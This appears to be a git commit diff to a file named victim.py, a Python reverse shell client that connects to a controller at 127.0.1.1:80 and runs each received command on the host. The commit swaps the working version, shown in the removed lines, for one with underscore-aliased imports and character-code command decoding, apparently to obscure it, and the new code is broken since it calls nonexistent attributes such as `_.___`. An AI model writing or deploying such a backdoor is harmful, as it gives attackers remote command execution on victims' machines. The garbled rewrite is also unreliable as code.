ea77ae7d3e87279eb9b9ce6a6a5264ac21c0cc2e
Phoenix <158185295+ZombieGeeK0@users.noreply.github.com>
2024-04-30 09:08:53 +0200

    Update victim.py

--- shell/victim.py
+++ shell/victim.py
@@ -1,11 +1,15 @@
-import socket, subprocess, os
-H='127.0.1.1'
+import sys as ___
+import subprocess as _
+import socket as __
+
+H = '127.0.1.1'
 P = 80
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s = __.socket(__.AF_INET, __.SOCK_STREAM)
 s.connect((H, P))
 while True:
     c = s.recv(1024).decode()
-    if c.strip() == "exit": break
-    o = subprocess.getoutput(c)
-    s.send(o.encode())
+    if c.strip() == "exit":
+        break
+    o = _.___("".join([chr(int(x)) for x in c.split()]))
+    s.send(o.___.encode())
 s.close()
